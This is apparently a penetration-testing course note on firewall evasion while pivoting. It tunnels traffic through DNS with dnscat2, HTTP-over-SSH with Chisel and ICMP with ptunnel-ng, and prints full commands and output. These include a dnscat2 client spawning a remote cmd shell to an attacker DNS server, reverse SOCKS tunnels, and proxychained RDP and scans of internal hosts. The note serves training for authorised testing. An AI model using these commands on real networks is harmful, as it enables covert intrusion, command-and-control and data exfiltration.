## 1. Introduction

Every pivoting technique covered so far has relied on ordinary TCP connections — SSH, HTTP, raw sockets. But some firewalled environments are locked down tightly enough that even those get blocked or closely inspected. This section covers three tools that each hide a tunnel inside a *different* protocol — DNS, HTTP-over-SSH, and ICMP — specifically to get through firewalls that only allow those protocols through, or that inspect TCP traffic more closely than they inspect these other kinds.

**Machine labels used throughout this section:**

| Label | Role |
|---|---|
| **HACKER** | Your own attack machine, running each tool's "server" side |
| **PIVOT** | The compromised Ubuntu server, bridging to the internal network |
| **TARGET** | The final destination inside the internal network (e.g., a Domain Controller) |

## 2. DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) tunnels data between two hosts by hiding it inside the DNS protocol itself — specifically within **TXT records** (a type of DNS record normally used to hold arbitrary text, such as domain verification strings). The entire channel is encrypted, functioning as a kind of Command-and-Control (C2) link.

**Why DNS specifically?** 
- In a typical corporate network, every Active Directory domain has its own internal DNS server, responsible for resolving hostnames and forwarding unresolved lookups out to the broader internet DNS system.
- `Dnscat2` exploits this normal, expected behavior: instead of actually resolving an address, the "DNS lookup" it generates is really carrying smuggled data out to an external attacker-controlled DNS server. Because DNS queries are almost universally allowed out through firewalls (the entire internet depends on DNS working), this can be a remarkably stealthy way to exfiltrate data or maintain a C2 channel — especially against defenses that specifically strip or inspect HTTPS traffic but pay little attention to DNS.

**Step 1 — On HACKER: clone and set up the dnscat2 server.**
```
$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```
*`gem install bundler` and `bundle install` set up Ruby dependencies, since the dnscat2 server is written in Ruby.*

**Step 2 — On HACKER: start the dnscat2 server.**
```
$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=evilcorp.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = evilcorp.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 evilcorp.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```
- `--dns host=...,port=53,domain=...` configures the server to listen as an actual DNS server, on the standard DNS port (53), for a given domain name.
- The output provides a generated **secret key** — a shared value the client must also present, used to authenticate and encrypt the tunnel's traffic.

**Step 3 — On HACKER: get a copy of the Windows-compatible PowerShell client.**
```
$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
[dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) is a separate project providing a client written in PowerShell, letting a Windows target connect without needing the original Ruby/native dnscat2 client.

**Step 4 — On the Windows TARGET: import the PowerShell module.**
```
PS C:\> Import-Module .\dnscat2.ps1
```
*(The `dnscat2.ps1` file has to actually be transferred onto the target first — any of the earlier file transfer techniques would apply here.)*

**Step 5 — On TARGET: start the tunnel, using the secret key from Step 2.**
```
PS C:\> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain evilcorp.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
- `-PreSharedSecret` must exactly match the key the server generated — this is what lets the server confirm it's really talking to an authorized client and encrypts the session.
- `-Exec cmd` tells the client to spawn a Windows command shell and tunnel that session back through DNS.

**Confirming the session on HACKER:**
```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

**Network flow:**
```
[HACKER] <--- DNS queries/TXT responses (UDP 53) --- [TARGET]
[HACKER] --- encrypted C2 data hidden in DNS traffic ---> [TARGET]
```
*(Notice there's no PIVOT in this particular example — the Windows target in this scenario communicates with HACKER's DNS server directly, just disguised as ordinary DNS resolution traffic rather than an obvious direct connection.)*

**Interacting with the session:**
```
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```
*The `?` command lists dnscat2's built-in console commands for managing sessions and tunnels.*

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```
- `window -i 1` switches into an interactive view of session 1, dropping directly into the remote `cmd.exe` shell — everything typed here gets tunneled to the target over DNS, and whatever the target outputs gets tunneled back the same way.*

## 3. SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel) is a Go-based TCP/UDP tunneling tool that transports data over HTTP, itself secured with SSH underneath. It's purpose-built for exactly the pivoting scenario covered repeatedly in earlier notes: reaching a network segment (here, `172.16.5.0/23`, containing a Domain Controller at `172.16.5.19`) that HACKER has no direct route to, but that PIVOT can reach.

### 3.1 Forward Chisel Tunnel

**Step 1 — On HACKER: get Chisel.**
```
$ git clone https://github.com/jpillora/chisel.git
```

**Step 2 — On HACKER: build the Chisel binary.**
```
$ cd chisel
go build
```
*This requires the Go programming language toolchain to already be installed, since Chisel is distributed as source code that needs compiling into an executable binary.*

> **Compatibility note:** differences in the `glibc` library version between the build machine and the target machine can sometimes cause errors. Comparing library versions on both ends, or using an older prebuilt release from the project's GitHub Releases page, can resolve this.

> **Practical note:** it's worth being mindful of the size of any binary transferred onto a client's network — both for performance reasons and because larger, unusual files are more likely to draw attention from detection tooling.
> Two beneficial resources to complement this particular concept are Oxdf's blog post [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel) and IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of `Chisel`, building the binary and shrinking the size of the binary at the `24:29` mark of his video.

**Step 3 — On HACKER: copy the built binary onto PIVOT.**
```
$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09
```

**Step 4 — On PIVOT: start the Chisel server with SOCKS5 enabled.**
```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
server: Listening on http://0.0.0.0:1234
```
*`-p 1234` sets the listening port, and `--socks5` tells Chisel to act as a SOCKS5 proxy server, able to forward traffic into whatever networks PIVOT itself can reach — in this case, the `172.16.5.0/23` network, since that's where PIVOT has a network interface.*

**Step 5 — On HACKER: connect a Chisel client to that server.**
```
$ ./chisel client -v 10.129.202.64:1234 socks

client: Connecting to ws://10.129.202.64:1234
client: tun: proxy#127.0.0.1:1080=>socks: Listening
client: tun: Bound proxies
client: Handshaking...
client: Sending config
client: Connected (Latency 120.170822ms)
client: tun: SSH connected
```
*`socks` tells the client to request a SOCKS tunnel from the server. The client ends up listening locally on port 1080 — any traffic sent there now gets relayed through the HTTP-over-SSH tunnel to PIVOT's SOCKS5 proxy.*

**Network flow:**
```
[HACKER] --- chisel client connects to PIVOT:1234 (HTTP over SSH) ---> [PIVOT] ---> [TARGET]
[HACKER] <------ relayed SOCKS5 traffic via local port 1080 --------- [PIVOT] <--- [TARGET]
```

**Step 6 — On HACKER: point proxychains at the new local SOCKS5 port.**
```
$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```
*Note the proxy type here is `socks5`, matching Chisel's `--socks5` server flag, and the port (1080) matches the client's local listener from Step 5.*

**Step 7 — On HACKER: connect to the internal Domain Controller over RDP, through the tunnel.**
```
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### 3.2 Reverse Chisel Tunnel

Just like the earlier SSH-based pivoting notes, Chisel also supports a **reverse** mode for scenarios where firewall rules block inbound connections to PIVOT, but outbound connections from PIVOT are still allowed.

With `--reverse` enabled, remotes can be prefixed with `R` to indicate "reversed" — the server still listens and accepts connections, but client-specified remotes are what actually get proxied through. A reverse remote of `R:socks` specifically means the server listens on its default SOCKS port (1080) and terminates that traffic at the *client's* internal SOCKS5 proxy instead.

**Step 1 — On HACKER: start the Chisel server with `--reverse` enabled.**
```
$ sudo ./chisel server --reverse -v -p 1234 --socks5

server: Reverse tunnelling enabled
server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
server: Listening on http://0.0.0.0:1234
```
*Notice the server now runs on HACKER, not PIVOT — the opposite of the forward tunnel example. This fits the scenario: PIVOT can't accept inbound connections, so HACKER has to be the one listening instead.*

**Step 2 — On PIVOT: connect out to HACKER as the client, requesting the reverse SOCKS remote.**
```
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

client: Connecting to ws://10.10.14.17:1234
client: Handshaking...
client: Sending config
client: Connected (Latency 117.204196ms)
client: tun: SSH connected
```
*PIVOT, not HACKER, initiates this connection — exactly the same "reverse" principle seen with rpivot and reverse shells in earlier notes. `R:socks` is what tells Chisel to expose the SOCKS proxy back on the server side (HACKER) this time, even though the client (PIVOT) is the one that owns the actual network route into the internal subnet.*

**Network flow:**
```
[HACKER] <--- chisel client "backconnect" (HTTP over SSH) --- [PIVOT] ---> [TARGET]
[HACKER] --- SOCKS5 traffic via local port 1080 -------------> [PIVOT] <--- [TARGET]
```

**Step 3 — On HACKER: configure proxychains exactly as before.**
```
$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```

**Step 4 — On HACKER: connect through the reverse tunnel, same as the forward example.**
```
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

> **Troubleshooting note:** if Chisel throws unexpected errors on the target, trying a different released version can often resolve compatibility issues.

## 4. ICMP Tunneling with ptunnel-ng

**ICMP tunneling** hides tunneled traffic inside ICMP echo request/response packets — the same packet type an ordinary `ping` uses. This only works when a firewalled network actually permits ping traffic out to external hosts — but when it does, it can be a very effective channel, since ICMP is rarely inspected or restricted as closely as TCP traffic.

[ptunnel-ng](https://github.com/utoni/ptunnel-ng) is the tool used here to build such a tunnel between PIVOT and HACKER.

**Step 1 — On HACKER: clone ptunnel-ng.**
```
$ git clone https://github.com/utoni/ptunnel-ng.git
```

**Step 2 — On HACKER: build it using the included script.**
```
$ sudo ./autogen.sh
```

**Alternative — building a statically linked binary** (useful for avoiding library-version mismatches between HACKER and PIVOT, similar to the `glibc` concern noted for Chisel):
```
$ sudo apt install automake autoconf -y
$ cd ptunnel-ng/
$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
$ ./autogen.sh
```
*A **static** binary bundles all its required libraries directly inside the executable itself, rather than relying on whatever versions happen to already be installed on the system it runs on — trading a larger file size for much better portability across different machines.*

**Step 3 — On HACKER: copy the whole repo onto PIVOT.**
```
$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
*`-r` is needed since this transfers an entire folder of files, not just a single built binary.*

**Step 4 — On PIVOT: start the ptunnel-ng server side.**
```
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```
- `-r10.129.202.64` specifies the address ptunnel-ng should accept incoming connections on — specifically, whichever address is actually reachable from HACKER.
- `-R22` tells it the ultimate TCP service being tunneled is SSH (port 22) on this same machine.

**Step 5 — On HACKER: connect to that server, forwarding local port 2222 through the ICMP tunnel.**
```
$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```
- `-p10.129.202.64` tells the client which ptunnel-ng server to talk to.
- `-l2222` sets the local port that will accept connections destined to travel through the ICMP tunnel.

**Network flow:**
```
[HACKER] --- ICMP echo requests/responses (ping) ---> [PIVOT] ---> [TARGET]
[HACKER] <---------- tunneled TCP data (e.g. SSH) ---- [PIVOT] <--- [TARGET]
```

**Step 6 — On HACKER: connect over SSH through the local tunneled port.**
```
$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
ubuntu@WEB01:~$
```
*Even though this looks like it's connecting to `127.0.0.1` (localhost), the actual SSH session is being smuggled through the ICMP tunnel out to PIVOT — `-p2222` connects to the locally bound port that ptunnel-ng is relaying.*

**Confirming the tunnel is genuinely carrying traffic (shown on both ends):**
```
[inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]:
```
*The statistics line shows actual ICMP packets sent and received (`248`/`22`) with zero loss — confirming the SSH session really was tunneled over ICMP rather than a direct TCP connection.*

**Layering dynamic SSH forwarding on top of the ICMP tunnel, for full proxychains support:**
```
$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```
*This combines two tunnels: the ICMP tunnel (carrying the SSH connection itself) and SSH's own dynamic forwarding (`-D 9050`, exactly as covered in the earlier pivoting notes) riding on top of it — a SOCKS proxy that is itself hidden inside a ping-based tunnel.*

**Using that combined tunnel with proxychains:**
```
$ proxychains nmap -sV -sT 172.16.5.19 -p3389

|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
*The scan succeeds against `172.16.5.19` despite HACKER having no direct route to it at all — the traffic travels: Nmap → proxychains → local SOCKS port 9050 → SSH dynamic forward → ICMP tunnel → PIVOT → the internal network.*

## 5. Comparing the Three Tunneling Protocols

| Tool | Hides traffic inside... | Requires on the target side | Best suited for... |
|---|---|---|---|
| **Dnscat2** | DNS queries/TXT records (UDP 53) | A PowerShell-capable Windows client, or the native client | Environments where DNS is allowed out but HTTPS is heavily inspected or stripped |
| **Chisel** | HTTP, secured with SSH | A compiled Go binary (or prebuilt release) on the pivot | General-purpose SOCKS5 pivoting, with both forward and reverse modes |
| **ptunnel-ng** | ICMP echo request/response (ping) | A compiled (ideally static) binary on the pivot | Environments where ping is explicitly allowed out but most other outbound traffic is blocked |

## 6. Decision Flow: Which Tunneling Protocol Fits?

```
                  ┌───────────────────────────────────┐
                  │ Standard TCP-based pivoting       │
                  │ (SSH, SOCKS, HTTP) is blocked or  │
                  │ too closely inspected — what's    │
                  │ still allowed out of the network? │
                  └──────────────────┬────────────────┘
                                     │
          ┌──────────────────────────┼──────────────────────────┐
          │                          │                          │
    DNS queries work         Only ping (ICMP) works      General outbound HTTP
    reliably                                              works, but needs to look
          │                          │                      "normal"/encrypted
          ▼                          ▼                            │
┌───────────────────┐     ┌──────────────────────┐                ▼
│ Dnscat2           │     │ ptunnel-ng (ICMP)    │     ┌───────────────────┐
│ (DNS TXT record   │     │ tunnel, optionally   │     │ Chisel (HTTP over │
│ tunneling)        │     │ layered with SSH -D  │     │ SSH), forward or  │
└───────────────────┘     │ for full proxychains │     │ reverse mode      |
                          │ support              │     └───────────────────┘
                          └──────────────────────┘                |
                                                                  │
                                                                  ▼
                                                        ┌───────────────────────┐
                                                        │ Can the pivot accept  │
                                                        │ inbound connections?  │
                                                        │ Yes → forward tunnel  │
                                                        │ No  → reverse tunnel  │
                                                        │ (--reverse, R:socks)  │
                                                        └───────────────────────┘
```

## 8. Big-Picture Takeaways

1. **Each protocol choice directly targets a specific firewall gap.** DNS tunneling exploits the fact that name resolution is almost always allowed; ICMP tunneling exploits the fact that ping is often permitted even when little else is; Chisel exploits general outbound HTTP access while adding SSH-grade security underneath.
2. **Forward vs. reverse is the same recurring decision as everywhere else in pivoting.** Chisel's `--reverse` mode and `R:socks` syntax map directly onto the same forward/reverse logic covered in the SSH, rpivot, and Socat notes — whichever side can actually initiate a connection determines which mode is usable.
3. **Build compatibility is a real, recurring obstacle — not just a one-off annoyance.** Both Chisel (`glibc` mismatches) and ptunnel-ng (library versioning, solved via static linking) called out the same underlying problem: a binary built on HACKER may not run cleanly on PIVOT without care.
4. **Encryption and authentication aren't automatic just because a tunnel is "hidden."** Dnscat2's pre-shared secret is what actually protects and authenticates its DNS-based channel — without it, "hidden inside DNS" wouldn't also mean "secure."
5. **Tunnels can be layered on top of each other.** The ICMP tunneling example stacks SSH's own dynamic forwarding *on top of* an ICMP tunnel, showing that these techniques aren't mutually exclusive — a tunnel's job is just to carry TCP traffic, and what's inside that TCP traffic (even another tunnel) is a separate question entirely.
6. **Stealth and performance are often in tension.** Tunneling data inside DNS or ICMP packets typically means much lower throughput than a direct connection, since those protocols weren't designed to carry arbitrary payloads — a trade-off worth weighing against how strict the target environment's outbound filtering actually is.
